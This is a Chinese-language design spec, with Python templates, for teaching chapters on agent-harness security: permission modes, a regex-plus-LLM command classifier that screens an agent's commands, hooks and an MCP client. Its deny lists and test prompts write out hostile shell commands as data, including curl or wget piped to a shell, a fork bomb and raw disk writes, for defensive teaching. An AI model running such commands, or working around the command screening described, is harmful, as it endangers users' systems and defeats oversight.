# Phase 5 & Phase 6: SECURITY, EXTENSIBILITY & PRODUCTION — 开发规格文档

> **Phase 5 目标**: 新增 s13-s17 共 5 个章节，填补教学项目与真实 Claude Code 源码之间在权限、安全、Hooks、MCP 方面的差距。
> **Phase 6 目标**: 新增 s18-s23 共 6 个章节，深入 Session Memory、跨会话持久记忆、Auto Mode 分类器、Bash 安全深度、Plugin 系统、Sandbox 隔离。
> **分工说明**: 每个模块标注了 `【模块】` 前缀，可独立分配给不同开发者。
> **分析来源**: 基于 `/Users/yanghaoran/Code/claude-code` 源码（2026-03-31）的完整分析。

---

## 一、总体架构

### 新增章节依赖关系

```
Phase 5:
s02 (工具分发)
 ├── s13 (权限守卫) ──→ s14 (安全分类器) ──┐
 │                                          ├── s17 (安全扩展总成)
 ├── s15 (Hooks 事件系统) ──────────────────┤
 │                                          │
 └── s16 (MCP 集成) ───────────────────────┘

Phase 6:
s06 (上下文压缩) ──→ s18 (Session Memory) ──→ s22 (跨会话 Memory)
s14 (安全分类器) ──→ s19 (Auto Mode 分类器)
s13 (权限守卫)   ──→ s20 (Bash 安全深度)
s05 (Skills)     ──→ s21 (Plugin 系统)
s13 (权限守卫)   ──→ s23 (Sandbox 隔离)
```

### 新增 Layer 定义

现有 5 层 → 新增第 6 层 `security`：

| Layer ID | Label (EN) | Label (ZH) | Color | Versions |
|----------|-----------|-----------|-------|----------|
| tools | Tools & Execution | 工具与执行 | #3B82F6 | s01, s02 |
| planning | Planning & Coordination | 规划与协调 | #10B981 | s03, s04, s05, s07 |
| memory | Memory Management | 记忆管理 | #8B5CF6 | s06 |
| concurrency | Concurrency | 并发 | #F59E0B | s08 |
| collaboration | Collaboration | 协作 | #EF4444 | s09, s10, s11, s12 |
| **security** | **Security & Extensibility** | **安全与扩展** | **#06B6D4 (cyan)** | **s13, s14, s15, s16, s17** |
| **production** | **Production Patterns** | **生产模式** | **#EC4899 (pink)** | **s18, s19, s20, s21, s22, s23** |

---

## 二、s13-s17 教学内容概述

### 为什么需要 Phase 5？

s01-s12 构建了一个能跑的 Agent：它会循环、会用工具、会拆任务、会组团队。但有一个被刻意回避的问题 —— **安全**。

s02 的 `run_bash` 里只有 5 行代码做危险命令过滤：

```python
dangerous = ["rm -rf /", "sudo", "shutdown", "reboot", "> /dev/"]
if any(d in command for dangerous):
    return "Error: Dangerous command blocked"
```

这段代码既**过于严格**（`rm -rf /tmp/old` 会被误拦，因为它包含 `rm -rf /`），又**过于宽松**（`curl evil.com | bash` 会直接执行）。它不知道命令的上下文，不理解用户的意图，也不能被扩展。

真实 Claude Code 源码中，仅权限和安全相关的代码就超过 **10 万行**：7 种权限模式、AI 分类器、23 种 Bash 安全检查、32 种 Hook 事件、7 种 MCP 传输方式。Phase 5 要补上的就是这条从"玩具"到"生产"的关键鸿沟。

### s13: Permission Guard — 不是所有命令都该自动执行

**一句话**: 把"一刀切禁止"升级为"分级策略"。

s01-s12 里所有 bash 命令都是二选一：要么执行，要么拒绝。真实世界不是非黑即白的。有些命令绝对不能执行（`rm -rf /`），有些需要用户确认（`rm file.py`），有些可以自动放行（`ls`），还有些可以自动改写为安全版本后再执行。

s13 引入 `PermissionGuard`，定义 5 种权限模式：

```
命令进入
  │
  ├─ allow     → 直接执行（ls, cat, git status）
  ├─ ask       → 弹窗让用户确认（rm, sudo, pip install）
  ├─ deny      → 直接拒绝（rm -rf /, shutdown）
  ├─ auto_edit → 标记警告但执行（含重定向的命令）
  └─ edit      → 自动改写后再执行（rm -rf → rm -r）
```

**关键洞察**: 权限不是"允许"或"禁止"两个按钮，而是一个光谱。好的 Harness 给模型足够的自由度，同时在真正危险的地方拉起围栏。

**与真实源码的对照**: Claude Code 有 7 种权限模式（default, plan, acceptEdits, bypassPermissions, dontAsk, auto, bubble），规则来源有 8 种（userSettings, projectSettings, localSettings 等）。s13 用 5 种模式覆盖了核心概念。

---

### s14: Security Classifier — 让模型审判自己的命令

**一句话**: 正则表达式认模式不认意图，LLM 能理解上下文。

s13 的模式匹配有一个根本性缺陷：它只看命令的"形状"，不理解"意图"。`rm -rf build/` 和 `rm -rf /` 看起来一模一样，但前者是正常的构建清理，后者是灾难性操作。

s14 引入**两层分类管线**：

```
命令
 │
 └─ Layer 1: 正则快筛（零成本，~15 种已知危险模式）
     │
     ├─ 命中 → deny/ask（确定性结果，无需 LLM）
     │
     └─ 未命中 → Layer 2: LLM 分类（~10 tokens/次）
                  │
                  ├─ safe      → allow
                  ├─ moderate  → ask（需要用户确认）
                  └─ dangerous → deny
```

正则快筛处理已知威胁（速度快、零成本），LLM 分类处理未知命令（理解上下文、判断意图）。两层配合，既高效又准确。

**关键洞察**: LLM 分类器不是"更高级的正则"，而是一种完全不同的安全思路 —— 从"匹配危险模式"变成"理解命令意图"。模型能区分 `rm -rf node_modules/`（正常清理）和 `rm -rf ~`（灾难操作），因为它们在语义上完全不同。

**与真实源码的对照**: Claude Code 的 `yoloClassifier` 是一个 52KB 的安全分类器，会分析整个对话历史来判断命令安全性。`bashSecurity.ts` 包含 23 种检查模式，涵盖命令替换检测、heredoc 注入、Zsh 危险命令等。s14 用两层管线覆盖了核心思路。

---

### s15: Hooks System — 在模型和工具之间插一个拦截层

**一句话**: 不改工具代码，也能改变工具的行为。

s13-s14 的安全检查是写死在 `run_bash` 函数内部的。如果你想实现"每次写文件后自动 git add"或"每次 bash 命令前记录审计日志"，必须修改每个工具函数的源码。这违反了开闭原则。

s15 引入 `HookManager`，在工具执行的"之前"和"之后"定义拦截点：

```
LLM 调用工具
     │
     ▼
[Pre-tool Hook]  ──block──> 返回 "被 hook 拦截"
     │
     ▼
[执行工具 handler]
     │
     ▼
[Post-tool Hook]  ──observe──> 记录日志、触发副作用
     │
     ▼
返回结果
```

Hook 有 3 种模式：**observe**（只看不改）、**modify**（改参数或结果）、**block**（直接拦截）。教学版实现 8 种事件（PreToolUse, PostToolUse, PreBash, PostBash, AgentStart, AgentStop, OnError, OnCompact），覆盖了工具执行的全生命周期。

**关键洞察**: Hooks 把"安全检查"从工具内部移到了工具外部。工具只需要做自己的事（执行命令、读写文件），拦截逻辑全部由 Hook 管理。这意味着你可以动态注册新 Hook，而不需要修改任何工具代码。

**与真实源码的对照**: Claude Code 有 32 种 Hook 事件和 3 种执行方式（Shell Hook, Agent Hook, HTTP Hook）。教学版用 8 种事件 + 3 种模式覆盖了核心概念，并内置了 3 个演示 Hook（审计日志、危险命令拦截、自动 git add）。

---

### s16: MCP Client — 工具不必内建，外部服务器也能提供

**一句话**: 把工具分发从 Python 字典升级为网络协议。

s02-s15 的所有工具都是 Python 函数，写死在 `TOOL_HANDLERS` 字典里。如果你想加一个"查数据库"的工具，必须写 Python 代码、重启进程。真实世界里，工具可能来自任何地方：数据库查询、API 调用、文件分析器……

s16 引入 MCP（Model Context Protocol）客户端，通过标准协议连接外部工具服务器：

```
Agent 启动
     │
     ▼
[MCPClient 连接 stdio 服务器]
     │
     ▼
[discover_tools() 发现外部工具]   ← JSON-RPC: tools/list
     │
     ▼
[注册到 TOOL_HANDLERS]           ← 动态扩展，无需改源码
     │
     ▼
agent_loop 正常运行
LLM 调用 "count_lines" → MCP 路由 → 外部服务器执行
```

MCP 的核心思想是**协议统一**：不管是本地子进程（stdio）还是远程 HTTP 端点，工具的发现、调用、返回都用同一个 JSON-RPC 协议。教学版支持 2 种传输方式（stdio 和 streamable_http），并内置了一个 Mock 文件分析服务器用于演示。

**关键洞察**: MCP 把"工具"从一个 Python 函数变成一个**网络服务**。这意味着任何人都可以用任何语言编写工具服务器，Agent 只需要知道协议就能调用。这是从"单体应用"到"微服务架构"的转变。

**与真实源码的对照**: Claude Code 的 MCP 客户端（`services/mcp/client.ts`）有 119KB，支持 7 种传输方式（stdio, sse, sse-ide, http, ws, ws-ide, sdk）和 OAuth 认证（89KB）。教学版用 2 种传输方式和内置 Mock 服务器覆盖了核心概念。

---

### s17: Secure Extension Harness — 四道防线，一个循环

**一句话**: 各层职责清晰，互不干扰，这才是生产级 Harness 的核心。

s13-s16 各自是一个能跑的独立 Agent。但真实系统需要所有层同时工作。s17 把它们组合成一条清晰的执行管线：

```
LLM 调用工具
     │
     ▼
[1] PreToolUse Hook    ──block──> 返回错误      ← s15
     │
     ▼
[2] Security Classifier ──deny───> 返回错误     ← s14
     │
     ▼
[3] Permission Guard    ──deny───> 返回错误      ← s13
     │                    ──ask───> 用户确认
     │
     ▼
[4] Execute (内建 or MCP)                        ← s02 + s16
     │
     ▼
[5] PostToolUse Hook    (审计日志)               ← s15
     │
     ▼
返回结果
```

每一层只回答一个问题：
- Hook: "这个动作需要被拦截吗？"
- Classifier: "这个命令的意图是什么？"
- Permission: "这个意图被允许吗？"
- Execute: "执行并返回结果"

层与层之间不通信、不耦合。你可以拔掉任何一层，其他层不受影响。

**关键洞察**: 生产级 Harness 的核心不是"功能多"，而是"职责清"。每一层是一个独立的策略单元，可以单独测试、单独替换、单独关闭。这种架构让你在面对新的安全威胁时，只需要增加一层，而不是重写整个系统。

**与真实源码的对照**: Claude Code 的 `execute_tool` 管线包含了更多层：Prompt 缓存检查、Token 预算检查、并发安全检查、结果大小截断等。但核心架构与 s17 一致：预检查 → 执行 → 后处理。

---

### Phase 5 课程总结

| 章节 | 核心问题 | 回答 | 新增机制 |
|------|---------|------|---------|
| **s13** | 谁来决定能不能执行？ | 权限策略 | PermissionGuard (5 种模式) |
| **s14** | 怎么判断命令是否危险？ | 两层分类 | SecurityClassifier (regex + LLM) |
| **s15** | 在哪里拦截工具调用？ | 生命周期插桩 | HookManager (8 种事件, 3 种模式) |
| **s16** | 怎么接入外部工具？ | 标准协议 | MCPClient + MCPManager (stdio/http) |
| **s17** | 怎么让所有层协同工作？ | 执行管线 | 5 层管线: Hook → Classify → Permission → Execute → PostHook |

---

## 四、后端课程文件 (Python)

### 【模块 A】s13: Permission Guard (权限守卫)

**文件**: `agents/s13_permission_guard.py`
**预计行数**: ~230 行
**依赖**: s02

#### 文件头部模板

```python
#!/usr/bin/env python3
# Harness: permission guard -- not every command should run automatically.
"""
s13_permission_guard.py - Permission Guard

The 5-line string filter from s02 was a toy. Real systems need a
permission model: allow / ask / deny / auto-edit / edit.

    Command flow:

        LLM calls bash tool
               |
               v
        +------------------+
        | PermissionGuard  |
        |   classify()     |
        +--------+---------+
                 |
         +-------+-------+-------+-------+
         |       |       |       |       |
       [allow]  [ask]  [deny]  [auto]  [edit]
         |       |       |       |       |
         v       v       v       v       v
      execute  prompt  block  flag    rewrite
               user            edit    in-place

Key insight: "把 '禁止' 升级为 '策略' -- 从一条 if 到一个权限模型。"
"""
```

#### 常量定义

```python
PERMISSION_MODES = ("allow", "ask", "deny", "auto_edit", "edit")

# 自动放行的命令基础名
ALLOWED_COMMANDS = {
    "ls", "cat", "pwd", "echo", "head", "tail", "wc", "sort",
    "grep", "find", "git", "which", "type", "file", "diff",
    "python", "python3", "node", "npm", "pip",
}

# 始终拒绝的模式 (正则)
DENIED_PATTERNS = [
    (r"rm\s+-rf\s+/(?!\w)", "Root directory recursive delete"),
    (r"sudo\s+rm", "sudo + rm"),
    (r">\s*/etc/", "Overwrite system config"),
    (r"mkfs\.", "Format filesystem"),
    (r"dd\s+.*of=/dev/", "Raw disk write"),
    (r":\(\)\{.*:\|:&\}", "Fork bomb"),
    (r"shutdown|reboot|halt|poweroff", "System shutdown"),
    (r"chmod\s+-R\s+777\s+/", "Recursive 777 on root"),
    (r"curl.*\|\s*(ba)?sh", "Remote script execution"),
    (r"wget.*\|\s*(ba)?sh", "Remote script execution"),
]

# 需要用户确认的模式
ASK_PATTERNS = [
    (r"rm\s+", "File deletion"),
    (r"sudo\s+", "Elevated privileges"),
    (r"pip\s+install", "Package installation"),
    (r"npm\s+install", "Package installation"),
    (r"git\s+push", "Git push"),
    (r"git\s+reset", "Git reset"),
    (r"docker\s+rm", "Docker remove"),
    (r"kill\s+", "Process termination"),
]

# 命令改写规则: (匹配模式, 替换) -- 仅示例
EDIT_REWRITE_RULES = [
    (r"rm\s+-rf\s+(.*)", r"rm -r \1  # auto-removed -f flag"),
]
```

#### 核心类

```python
import re
from dataclasses import dataclass
from pathlib import Path

@dataclass
class PermissionResult:
    mode: str       # allow / ask / deny / auto_edit / edit
    allowed: bool
    command: str    # 可能被改写后的命令
    reason: str

class PermissionGuard:
    def __init__(self, config_path: Path = None):
        """可从 .permissions.json 加载自定义规则覆盖默认规则"""
        self._denied = [(re.compile(p), r) for p, r in DENIED_PATTERNS]
        self._ask = [(re.compile(p), r) for p, r in ASK_PATTERNS]
        self._edit = [(re.compile(p), r) for p, r in EDIT_REWRITE_RULES]
        # TODO: load from config_path if provided

    def classify(self, command: str) -> tuple[str, str]:
        """返回 (mode, reason)"""
        # 1. deny 检查
        for pat, reason in self._denied:
            if pat.search(command):
                return ("deny", reason)
        # 2. 白名单放行
        base = command.split()[0] if command.split() else ""
        if base in ALLOWED_COMMANDS:
            return ("allow", "")
        # 3. edit 改写
        for pat, replacement in self._edit:
            if pat.search(command):
                rewritten = pat.sub(replacement, command)
                return ("edit", rewritten)
        # 4. ask 确认
        for pat, reason in self._ask:
            if pat.search(command):
                return ("ask", reason)
        # 5. 默认放行
        return ("allow", "")

    def check(self, command: str) -> PermissionResult:
        mode, info = self.classify(command)
        if mode == "deny":
            return PermissionResult(mode, False, command, info)
        elif mode == "ask":
            approved = self._prompt_user(command, info)
            return PermissionResult(mode, approved, command, info)
        elif mode == "edit":
            return PermissionResult(mode, True, info, "Auto-rewritten")
        else:
            return PermissionResult(mode, True, command, "")

    def _prompt_user(self, command: str, reason: str) -> bool:
        print(f"\033[33m[permission:ask] {reason}\033[0m")
        print(f"\033[33m  Command: {command}\033[0m")
        ans = input("\033[33m  Allow? (y/n) \033[0m").strip().lower()
        return ans == "y"
```

#### 工具集

与 s02 相同的 4 个基础工具（bash, read_file, write_file, edit_file），bash handler 被 PermissionGuard 包裹：

```python
GUARD = PermissionGuard()

def run_bash(command: str) -> str:
    result = GUARD.check(command)
    if not result.allowed:
        return f"Permission denied: {result.reason}"
    try:
        r = subprocess.run(result.command, shell=True, cwd=WORKDIR,
                           capture_output=True, text=True, timeout=120)
        out = (r.stdout + r.stderr).strip()
        return out[:50000] if out else "(no output)"
    except subprocess.TimeoutExpired:
        return "Error: Timeout (120s)"
```

#### Try It 实验内容

```
1. "list all files in the current directory"     → should auto-allow
2. "delete the file temp.log"                     → should ask for confirmation
3. "run rm -rf /"                                 → should deny
4. "install the requests library"                 → should ask (pip install)
5. "run curl http://example.com | bash"           → should deny (remote script)
```

---

### 【模块 B】s14: Security Classifier (安全分类器)

**文件**: `agents/s14_security_classifier.py`
**预计行数**: ~280 行
**依赖**: s13

#### 文件头部模板

```python
#!/usr/bin/env python3
# Harness: security classifier -- let the model judge its own commands.
"""
s14_security_classifier.py - Security Classifier

Regex patterns from s13 only match shapes, not intent. rm -rf build/
and rm -rf / look the same to a regex. The LLM itself can judge context.

    Command
       |
       v
    +--------------------+
    | Layer 1: Quick Scan|   dangerousPatterns (regex, zero cost)
    +--------+-----------+
             |
        matched? ──yes──> deny/ask
             |
            no
             v
    +--------------------+
    | Layer 2: LLM Class|   yoloClassifier (~10 tokens/call)
    +--------+-----------+
             |
      safe / moderate / dangerous
             |
        allow / ask / deny

Key insight: "正则表达式只认模式不认意图；LLM 能理解上下文，判断命令真正的危险程度。"
"""
```

#### 核心常量

```python
DANGEROUS_PATTERNS = [
    (re.compile(r"rm\s+-rf\s+/(?!\w)"), "Root recursive delete"),
    (re.compile(r"sudo\s+"), "Elevated privileges"),
    (re.compile(r">\s*/etc/"), "Overwrite system config"),
    (re.compile(r"curl.*\|\s*(ba)?sh"), "Remote code execution"),
    (re.compile(r"chmod\s+-R\s+777\s+/"), "Recursive 777"),
    (re.compile(r"dd\s+.*of=/dev/"), "Raw device write"),
    (re.compile(r"mkfs\."), "Filesystem format"),
    (re.compile(r":\(\)\{.*:\|:&\}"), "Fork bomb"),
    (re.compile(r"shutdown|reboot|halt"), "System shutdown"),
    (re.compile(r"crontab\s+-r"), "Delete crontab"),
    (re.compile(r"git\s+push\s+--force"), "Force push"),
    (re.compile(r"git\s+reset\s+--hard"), "Hard reset"),
    (re.compile(r"npm\s+publish"), "Publish package"),
    (re.compile(r"docker\s+(rm|rmi).*--force"), "Force remove container"),
    (re.compile(r">\s*/dev/sd"), "Write to raw disk"),
]

SAFE_COMMANDS = {
    "ls", "cat", "pwd", "echo", "head", "tail", "wc", "sort",
    "grep", "find", "git", "which", "type", "file", "diff",
    "python", "python3", "node", "npm", "pip", "tree", "du",
    "stat", "date", "whoami", "hostname", "uname",
}

CLASSIFIER_PROMPT = """Classify this shell command's danger level.
Reply with EXACTLY one word: safe, moderate, or dangerous.

- safe: read-only or non-destructive (ls, cat, git status)
- moderate: writes files but recoverable (rm single file, pip install)
- dangerous: irreversible or system-wide (rm -rf /, sudo, force push)

Command: {command}
Context (last task): {context}"""
```

#### 核心类

```python
class SecurityClassifier:
    def __init__(self, client, model):
        self.client = client
        self.model = model

    def quick_scan(self, command: str) -> tuple[str, str] | None:
        """Layer 1: 正则快筛。返回 (level, reason) 或 None"""
        for pat, reason in DANGEROUS_PATTERNS:
            if pat.search(command):
                return ("dangerous", reason)
        return None

    def llm_classify(self, command: str, context: str = "") -> str:
        """Layer 2: LLM 分类。返回 safe/moderate/dangerous"""
        prompt = CLASSIFIER_PROMPT.format(command=command, context=context[-300:])
        resp = self.client.messages.create(
            model=self.model,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=10,
        )
        answer = resp.content[0].text.strip().lower()
        # 容错：只取第一个有效词
        for level in ("safe", "moderate", "dangerous"):
            if level in answer:
                return level
        return "moderate"  # 默认中等风险

    def classify(self, command: str, context: str = "") -> dict:
        """完整分类管线"""
        # Layer 1
        quick = self.quick_scan(command)
        if quick:
            level, reason = quick
            mode = {"dangerous": "deny", "moderate": "ask"}.get(level, "deny")
            return {"level": level, "mode": mode, "reason": reason, "source": "pattern"}

        # 白名单
        base = command.split()[0] if command.split() else ""
        if base in SAFE_COMMANDS:
            return {"level": "safe", "mode": "allow", "reason": "", "source": "whitelist"}

        # Layer 2
        level = self.llm_classify(command, context)
        mode = {"safe": "allow", "moderate": "ask", "dangerous": "deny"}[level]
        return {"level": level, "mode": mode, "reason": f"LLM classified as {level}", "source": "llm"}
```

#### PermissionGuard 改造

```python
class PermissionGuard:
    def __init__(self, classifier: SecurityClassifier = None):
        self.classifier = classifier

    def check(self, command: str, context: str = "") -> PermissionResult:
        if self.classifier:
            result = self.classifier.classify(command, context)
            mode = result["mode"]
            if mode == "deny":
                return PermissionResult("deny", False, command, result["reason"])
            elif mode == "ask":
                approved = self._prompt_user(command, result["reason"])
                return PermissionResult("ask", approved, command, result["reason"])
            else:
                return PermissionResult("allow", True, command, "")
        # fallback to s13 pattern matching
        ...
```

#### Try It 实验内容

```
1. "delete the build/ directory"                  → LLM 应判断为 moderate (ask)
2. "list all python files"                        → quick scan whitelist -> allow
3. "run git push --force origin main"             → quick scan pattern -> deny
4. "run pip install numpy"                        → LLM 应判断为 moderate (ask)
5. "create a new file called test.py"             → LLM 应判断为 safe (allow)
```

---

### 【模块 C】s15: Hooks System (Hooks 事件系统)

**文件**: `agents/s15_hooks_system.py`
**预计行数**: ~300 行
**依赖**: s13

#### 文件头部模板

```python
#!/usr/bin/env python3
# Harness: hooks system -- intercept between model and tool.
"""
s15_hooks_system.py - Hooks System

Security checks from s13-s14 are hardcoded inside handlers.
Hooks let you intercept, modify, or block tool calls without
touching any handler code.

    LLM calls tool
         |
         v
    +-------------------+
    | Pre-tool Hook     | ──block──> return "blocked by hook"
    +--------+----------+
             | (if not blocked)
             v
    +-------------------+
    | Execute handler   |
    +--------+----------+
             |
             v
    +-------------------+
    | Post-tool Hook    | (observe/log/modify result)
    +--------+----------+
             |
             v
    return result

Key insight: "Hooks 不改变工具的行为，但改变了工具何时、如何、是否被执行。"
"""
```

#### 核心常量

```python
HOOK_EVENTS = (
    "PreToolUse",   # 工具执行前
    "PostToolUse",  # 工具执行后
    "PreBash",      # bash 执行前 (更细粒度)
    "PostBash",     # bash 执行后
    "AgentStart",   # agent_loop 启动
    "AgentStop",    # agent_loop 结束
    "OnError",      # 工具出错
    "OnCompact",    # 上下文压缩
)

HOOK_MODES = ("observe", "modify", "block")
```

#### 核心类

```python
from dataclasses import dataclass, field
from typing import Callable
from pathlib import Path
import json

@dataclass
class Hook:
    event: str
    mode: str
    handler: Callable
    name: str
    description: str = ""
    tool_filter: str | None = None  # 仅匹配特定工具

class HookManager:
    def __init__(self, hooks_dir: Path = None):
        self._hooks: dict[str, list[Hook]] = {e: [] for e in HOOK_EVENTS}
        self._hooks_dir = hooks_dir or WORKDIR / ".hooks"
        self._hooks_dir.mkdir(exist_ok=True)
        self._load_defaults()

    def _load_defaults(self):
        """注册 3 个内置 hook"""
        # 1. bash 审计日志
        self.register("PreBash", "observe", self._audit_log,
                      "bash_audit_log", "Log all bash commands to audit.jsonl")
        # 2. 危险命令拦截 (与 s13 协同)
        self.register("PreBash", "block", self._dangerous_block,
                      "dangerous_command_block", "Block known dangerous patterns")
        # 3. 自动 git add
        self.register("PostToolUse", "observe", self._auto_git_add,
                      "auto_git_add", "Auto git add after write/edit",
                      tool_filter="write_file")

    def register(self, event: str, mode: str, handler: Callable,
                 name: str, description: str = "", tool_filter: str = None):
        hook = Hook(event, mode, handler, name, description, tool_filter)
        self._hooks[event].append(hook)

    def unregister(self, name: str):
        for event in self._hooks:
            self._hooks[event] = [h for h in self._hooks[event] if h.name != name]

    def fire(self, event: str, context: dict) -> dict | None:
        """
        返回 None = 继续
        返回 {"action": "block", "reason": "..."} = 阻止
        返回 {"action": "modify", **overrides} = 修改参数
        """
        for hook in self._hooks.get(event, []):
            # tool_filter 检查
            if hook.tool_filter and context.get("tool") != hook.tool_filter:
                continue
            result = hook.handler(context)
            if result is None:
                continue  # observe
            if isinstance(result, str):
                return {"action": "block", "reason": result, "hook": hook.name}
            if isinstance(result, dict):
                if result.get("action") == "block":
                    return result
                if result.get("action") == "modify":
                    context.update(result.get("modify", {}))
        return None

    def list_hooks(self) -> str:
        lines = []
        for event, hooks in self._hooks.items():
            for h in hooks:
                lines.append(f"  {event:15} [{h.mode:7}] {h.name}: {h.description}")
        return "\n".join(lines)

    # --- 内置 Hook 处理函数 ---

    def _audit_log(self, context: dict) -> None:
        log_file = self._hooks_dir / "audit.jsonl"
        entry = {"tool": context.get("tool"), "command": context.get("input", {}).get("command")}
        log_file.open("a").write(json.dumps(entry) + "\n")

    def _dangerous_block(self, context: dict) -> str | None:
        cmd = context.get("input", {}).get("command", "")
        dangerous = ["rm -rf /", "curl.*| sh", "mkfs", "dd of=/dev/"]
        import re
        for d in dangerous:
            if re.search(d, cmd):
                return f"Dangerous pattern blocked: {d}"

    def _auto_git_add(self, context: dict) -> None:
        path = context.get("input", {}).get("path", "")
        if path:
            subprocess.run(["git", "add", path], cwd=WORKDIR,
                         capture_output=True, text=True)
```

#### 工具集 (新增 2 个)

```python
# hook_register 工具
{
    "name": "hook_register",
    "description": "Register a hook to intercept tool calls. Events: PreToolUse, PostToolUse, PreBash, PostBash, AgentStart, AgentStop, OnError, OnCompact. Modes: observe, modify, block.",
    "input_schema": {
        "type": "object",
        "properties": {
            "event": {"type": "string", "description": "Hook event name"},
            "mode": {"type": "string", "description": "observe, modify, or block"},
            "name": {"type": "string", "description": "Unique hook name"},
            "description": {"type": "string", "description": "What this hook does"},
            "tool_filter": {"type": "string", "description": "Only trigger for this tool name"}
        },
        "required": ["event", "mode", "name"]
    }
}

# hook_list 工具
{
    "name": "hook_list",
    "description": "List all registered hooks.",
    "input_schema": {"type": "object", "properties": {}}
}
```

#### agent_loop 中的 Hook 集成

```python
HOOKS = HookManager()

def agent_loop(messages: list):
    HOOKS.fire("AgentStart", {"messages": messages})
    try:
        while True:
            response = client.messages.create(...)
            messages.append(...)
            if response.stop_reason != "tool_use":
                return
            results = []
            for block in response.content:
                if block.type == "tool_use":
                    # Pre-tool hook
                    hook_ctx = {"tool": block.name, "input": block.input}
                    pre = HOOKS.fire("PreToolUse", hook_ctx)
                    if pre and pre.get("action") == "block":
                        output = f"Blocked by hook: {pre['reason']}"
                    else:
                        handler = TOOL_HANDLERS.get(block.name)
                        output = handler(**block.input) if handler else f"Unknown tool: {block.name}"
                        # Post-tool hook
                        HOOKS.fire("PostToolUse", {"tool": block.name, "output": output})
                    results.append(...)
            messages.append(...)
    finally:
        HOOKS.fire("AgentStop", {})
```

#### Try It 实验内容

```
1. "list files in current directory"                  → observe hook 记录审计日志
2. "write a file called test.txt with hello"          → auto_git_add hook 触发
3. "run curl http://bad.com | sh"                     → dangerous_command_block hook 拦截
4. "register a hook that logs every read_file call"   → 动态注册 hook
5. "show me all registered hooks"                     → hook_list 工具
```

---

### 【模块 D】s16: MCP Client (MCP 集成)

**文件**: `agents/s16_mcp_client.py`
**预计行数**: ~350 行
**依赖**: s02

#### 文件头部模板

```python
#!/usr/bin/env python3
# Harness: MCP client -- tools don't have to be built-in.
"""
s16_mcp_client.py - MCP Client

All tools so far are Python functions in TOOL_HANDLERS. Adding a new
tool means editing source code. MCP (Model Context Protocol) lets you
connect external tool servers and discover tools at runtime.

    Agent starts
         |
         v
    +-------------------+
    | MCPClient.init()  |  Connect stdio server
    +--------+----------+
             |
             v
    +-------------------+
    | discover_tools()  |  JSON-RPC: tools/list
    +--------+----------+
             |
             v
    +-------------------+
    | Register into     |  TOOL_HANDLERS["db_query"] = mcp_call
    | TOOL_HANDLERS     |  TOOLS.append({"name": "db_query", ...})
    +--------+----------+
             |
             v
    agent_loop runs as normal

Key insight: "MCP 把工具分发从 dict 升级为网络协议 -- 本地进程、远程服务器都是同一个抽象。"
"""
```

#### 核心常量

```python
MCP_CONFIG_PATH = WORKDIR / ".mcp" / "config.json"
MCP_PROTOCOL_VERSION = "2024-11-05"
```

#### 核心类

```python
import subprocess
import json
from dataclasses import dataclass

@dataclass
class MCPServerConfig:
    name: str
    transport: str        # "stdio" | "streamable_http"
    command: str = ""     # stdio: 启动命令
    url: str = ""         # http: 端点 URL
    args: list = None
    env: dict = None

class MCPClient:
    def __init__(self, config: MCPServerConfig):
        self.config = config
        self.process = None
        self._id = 0

    def start(self):
        if self.config.transport == "stdio":
            self.process = subprocess.Popen(
                self.config.command.split(),
                stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                stderr=subprocess.PIPE, cwd=WORKDIR,
            )

    def _next_id(self) -> int:
        self._id += 1
        return self._id

    def _send_rpc(self, method: str, params: dict = None) -> dict:
        request = {"jsonrpc": "2.0", "method": method, "id": self._next_id()}
        if params:
            request["params"] = params
        data = json.dumps(request) + "\n"
        self.process.stdin.write(data.encode())
        self.process.stdin.flush()
        line = self.process.stdout.readline().decode().strip()
        return json.loads(line).get("result", {}) if line else {}

    def discover_tools(self) -> list:
        result = self._send_rpc("tools/list")
        return result.get("tools", [])

    def call(self, tool_name: str, arguments: dict) -> str:
        result = self._send_rpc("tools/call", {
            "name": tool_name, "arguments": arguments
        })
        contents = result.get("content", [])
        return "\n".join(c.get("text", "") for c in contents if c.get("type") == "text")

    def shutdown(self):
        if self.process:
            self.process.terminate()
            self.process.wait(timeout=5)

class MCPManager:
    def __init__(self, config_path: Path = None):
        self._clients: dict[str, MCPClient] = {}
        self._tools: dict[str, tuple[str, dict]] = {}  # tool_name -> (server_name, schema)
        self._config_path = config_path or MCP_CONFIG_PATH

    def load_config(self) -> list[MCPServerConfig]:
        if not self._config_path.exists():
            return []
        data = json.loads(self._config_path.read_text())
        servers = data.get("mcpServers", {})
        return [MCPServerConfig(name=k, **v) for k, v in servers.items()]

    def connect_all(self) -> list[dict]:
        """连接所有配置的服务器，返回发现的工具列表"""
        discovered = []
        for config in self.load_config():
            client = MCPClient(config)
            client.start()
            tools = client.discover_tools()
            self._clients[config.name] = client
            for tool in tools:
                self._tools[tool["name"]] = (config.name, tool)
                discovered.append(tool)
        return discovered

    def call(self, tool_name: str, arguments: dict) -> str:
        if tool_name not in self._tools:
            return f"Unknown MCP tool: {tool_name}"
        server_name, _ = self._tools[tool_name]
        return self._clients[server_name].call(tool_name, arguments)

    def shutdown_all(self):
        for client in self._clients.values():
            client.shutdown()

    def list_servers(self) -> str:
        lines = []
        for name, client in self._clients.items():
            tools = [t for t, (s, _) in self._tools.items() if s == name]
            lines.append(f"  {name} ({client.config.transport}): {len(tools)} tools")
        return "\n".join(lines)
```

#### Mock MCP Server (教学用)

```python
# 内置在 s16 文件中，用于演示，不需要外部依赖
class MockMCPServer:
    """一个简单的文件分析 MCP 服务器，作为教学演示"""

    TOOLS = [
        {
            "name": "count_lines",
            "description": "Count lines in a file",
            "inputSchema": {
                "type": "object",
                "properties": {"path": {"type": "string"}},
                "required": ["path"],
            },
        },
        {
            "name": "search_content",
            "description": "Search for a pattern in files",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "pattern": {"type": "string"},
                    "path": {"type": "string"},
                },
                "required": ["pattern"],
            },
        },
    ]

    def handle(self, method: str, params: dict) -> dict:
        if method == "tools/list":
            return {"tools": self.TOOLS}
        elif method == "tools/call":
            name = params.get("name")
            args = params.get("arguments", {})
            if name == "count_lines":
                path = safe_path(args.get("path", ""))
                count = len(path.read_text().splitlines()) if path.exists() else 0
                return {"content": [{"type": "text", "text": f"{count} lines"}]}
            elif name == "search_content":
                import re
                pattern = args.get("pattern", "")
                results = []
                for f in WORKDIR.rglob("*.py"):
                    for i, line in enumerate(f.read_text().splitlines(), 1):
                        if re.search(pattern, line):
                            results.append(f"{f.name}:{i}: {line.strip()}")
                text = "\n".join(results[:20]) or "No matches found"
